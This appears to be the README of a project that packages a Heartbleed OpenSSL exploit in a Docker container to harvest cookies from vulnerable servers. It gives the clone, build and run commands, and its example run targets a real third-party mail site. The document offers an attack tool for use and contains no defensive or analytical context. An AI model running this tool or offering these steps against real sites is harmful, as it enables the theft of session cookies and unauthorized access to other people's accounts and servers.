# heartbleed-docker

A docker container to exploit heartbleed OpenSSL, and save the cookies

### Build & Run
```
git clone https://github.com/arthurnn/heartbleed-docker.git
cd heartbleed-docker
docker build -t arthurnn/heartbleed .

// change the target url to a vulnerable website
docker run -d -p 9099:9099 arthurnn/heartbleed mail.yahoo.com
```
